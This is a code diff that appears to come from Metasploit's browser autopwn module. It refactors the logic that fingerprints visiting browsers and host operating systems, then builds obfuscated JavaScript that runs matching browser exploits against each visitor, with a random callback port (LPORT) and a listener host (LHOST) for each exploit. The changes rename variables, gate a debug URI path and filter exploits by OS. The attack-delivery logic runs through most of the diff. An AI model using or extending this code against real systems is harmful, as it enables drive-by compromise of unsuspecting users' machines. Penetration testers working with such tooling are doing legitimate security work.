@@ -121,13 +121,17 @@ class Metasploit3 < Msf::Auxiliary
 		# For testing, set the exploit uri to the name of the exploit so it's
 		# easy to tell what is happening from the browser.
 		# XXX: Set to nil for release
-		#@exploits[name].datastore['URIPATH'] = nil  
-		@exploits[name].datastore['URIPATH'] = name  
+		if (datastore['DEBUG'])
+			@exploits[name].datastore['URIPATH'] = name  
+		else
+			@exploits[name].datastore['URIPATH'] = nil  
+		end
 
 		# set a random lport for each exploit.  There's got to be a better way
 		# to do this but it's still better than incrementing it
 		@exploits[name].datastore['LPORT'] = rand(32768) + 32768
 		@exploits[name].datastore['LHOST'] = @lhost
+		@exploits[name].datastore['EXITFUNC'] = datastore['EXITFUNC'] || 'thread'
 		@exploits[name].exploit_simple(
 			'LocalInput'     => self.user_input,
 			'LocalOutput'    => self.user_output,
@@ -165,7 +169,6 @@ class Metasploit3 < Msf::Auxiliary
 			if (mod.respond_to?("autopwn_opts") and name =~ m_regex and name !~ e_regex)
 				next if !(init_exploit(name))
 				apo = mod.autopwn_opts
-				#p apo
 				apo[:name] = name
 				if apo[:classid]
 					# Then this is an IE exploit that uses an ActiveX control,
@@ -361,7 +364,7 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def build_noscript_response(cli, request)
-		client_db = get_client(cli.peerhost, request['User-Agent'])
+		client_info = get_client(cli.peerhost, request['User-Agent'])
 
 		response = create_response()
 		response['Expires'] = '0'
@@ -376,7 +379,7 @@ class Metasploit3 < Msf::Auxiliary
 			# don't assume anything about the browser. If ua_name is nil or
 			# generic, these exploits need to be sent regardless of browser.
 			# Either way, we need to send these exploits.
-			if (client_db.nil? || [nil, browser, "generic"].include?(client_db[:ua_name]))
+			if (client_info.nil? || [nil, browser, "generic"].include?(client_info[:ua_name]))
 				if (HttpClients::IE == browser)
 					response.body << "<!--[if IE]>\n"
 				end
@@ -402,17 +405,16 @@ class Metasploit3 < Msf::Auxiliary
 		response['Expires'] = '0'
 		response['Cache-Control'] = 'must-revalidate'
 
-		client_db = get_client(cli.peerhost, request['User-Agent'])
-		p client_db
-		p get_host({:host => cli.peerhost})
+		client_info = get_client(cli.peerhost, request['User-Agent'])
+		#print_status("Client info: #{client_info.inspect}")
+		host_info = get_host(cli.peerhost)
 
 		js = ::Rex::Exploitation::ObfuscateJS.new
 		# If we didn't get a client database, then the detection is
 		# borked or the db is not connected, so fallback to sending
 		# some IE-specific stuff with everything.  Otherwise, make
 		# sure this is IE before sending code for ActiveX checks.
-		#if (client_db.nil? || client_db[:ua_name] == HttpClients::IE)
-		if (client_db.nil? || [nil, HttpClients::IE].include?(client_db[:ua_name]))
+		if (client_info.nil? || [nil, HttpClients::IE].include?(client_info[:ua_name]))
 			# If we have a class name (e.g.: "DirectAnimation.PathControl"),
 			# use the simple and direct "new ActiveXObject()".  If we
 			# have a classid instead, first try creating a the object
@@ -489,10 +491,16 @@ class Metasploit3 < Msf::Auxiliary
 
 		@js_tests.each { |browser, sploits|
 			next if sploits.length == 0
-			#print_status("Building sploits for #{client_db[:ua_name]}")
-			if (client_db.nil? || [nil, browser, "generic"].include?(client_db[:ua_name]))
-				js << "function exploit#{browser}() { \n"
+			#print_status("Building sploits for #{client_info[:ua_name]}")
+			if (client_info.nil? || [nil, browser, "generic"].include?(client_info[:ua_name]))
+				# Make sure the browser names can be used as an identifier in
+				# case something wacky happens to them.
+				func_name = "exploit#{browser.gsub(/[^a-zA-Z]/, '')}"
+				js << "function #{func_name}() { \n"
 				sploits.map do |s|
+					if (host_info and host_info[:os_name] and s[:os_name])
+						next unless s[:os_name].include?(host_info[:os_name])
+					end
 					if s[:vuln_test]
 						# Wrap all of the vuln tests in a try-catch block so a
 						# single borked test doesn't prevent other exploits
@@ -509,9 +517,9 @@ class Metasploit3 < Msf::Auxiliary
 					end
 				end
 				js << "};\n" # end function exploit...()
-				js << "#{js_debug("'exploit func: exploit#{browser}()'")}\n"
-				js << "exploit#{browser}();\n" # run that bad boy
-				opts['Symbols']['Methods'].push("exploit#{browser}")
+				js << "#{js_debug("'exploit func: #{func_name}()'")}\n"
+				js << "#{func_name}();\n" # run that bad boy
+				opts['Symbols']['Methods'].push("#{func_name}")
 			end
 		}
 
